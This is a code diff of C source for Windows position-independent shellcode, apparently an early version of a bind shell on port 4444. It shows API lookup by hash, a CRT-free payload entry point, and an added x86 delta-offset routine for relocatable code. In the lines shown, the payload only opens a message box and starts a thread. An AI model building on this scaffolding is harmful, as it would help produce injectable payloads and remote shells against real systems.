@@ -12,13 +12,28 @@
 
 #define BIND_PORT 4444
 #define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
-
-
+/*
+*/
 #if defined(_WIN64)
 #else
+PVOID KGetGlobalVarAddr( PVOID pVar)
+{
+  PVOID pCurAddr = NULL;
+  __asm
+  {
+Start:
+    call lbl_Next
+lbl_Next:
+    pop eax
+    sub eax, 5
+    sub eax, offset Start
+    add eax, pVar
+    mov pCurAddr, eax
+  }
+  return pCurAddr;
+}
 void end_of_file( );
 #endif
-DWORD WINAPI Daemon( LPVOID lpThreadParameter ) ;
 // Write the logic for the primary payload here
 // Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
 // Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
@@ -46,35 +61,32 @@ VOID ExecutePayload( VOID )
 	char cmdline[] = { 'c', 'm', 'd', 0 };
 	char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
 	*/
-	char a1[] = { 'a' , '1' , 0 } ;
 	funcs f ;
 	HANDLE hThread[1] ;
 	DWORD dwThreadId[1] ;
-	PVOID address ;
 	#pragma warning( push )
 	f.LoadLibraryA				=	( FuncLoadLibraryA )GetProcAddressWithHash( 0x0726774C );
 	//pf->LoadLibraryA((LPTSTR) module2);
 	f.MessageBox					=	( FuncMessageBox )GetProcAddressWithHash( 0x07568345 ) ;
 	#pragma warning( disable : 4055 ) // Ignore cast warnings
 	#pragma warning( pop )
-
+	//f.MessageBox( NULL , NULL , NULL , 0 ) ;
 	InitialFuncs( &f ) ;	
-	f.MessageBox( NULL , NULL , NULL , 0 ) ;
-	address = Daemon ;
 	hThread[0] = f.CreateThread(
 		NULL ,
 		0 ,
-		(LPTHREAD_START_ROUTINE)f.MessageBox ,
+#if defined(_WIN64)
+		(LPTHREAD_START_ROUTINE)Daemon ,
+#else
+		(LPTHREAD_START_ROUTINE)KGetGlobalVarAddr(Daemon) ,
+#endif
 		NULL ,
 		0 ,
 		&dwThreadId[0]
 		) ;
+	//f.WaitForMultipleObjects( 1 , hThread , TRUE , INFINITE ) ;
+	//f.CloseHandle( hThread[0] ) ;
 	/*
-	f.MessageBox( NULL , NULL , NULL , 0 ) ;
-	f.WaitForMultipleObjects( 1 , hThread , TRUE , INFINITE ) ;
-	f.MessageBox( NULL , NULL , NULL , 0 ) ;
-	f.CloseHandle( hThread[0] ) ;
-	f.MessageBox( NULL , NULL , NULL , 0 ) ;
 	*/
 	/*
 	// Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
@@ -125,13 +137,6 @@ VOID ExecutePayload( VOID )
 #endif
 }
 
-DWORD WINAPI Daemon( LPVOID lpThreadParameter ) {
-	funcs f ;
-	char b1[] = { 'b' , '1' , 0 } ;
-	InitialFuncs( &f ) ;	
-	f.MessageBox( NULL , NULL , NULL , 0 ) ;
-	return 0 ;
-}
 #if defined(_WIN64)
 #else
 void __declspec(naked) end_of_file( ) {
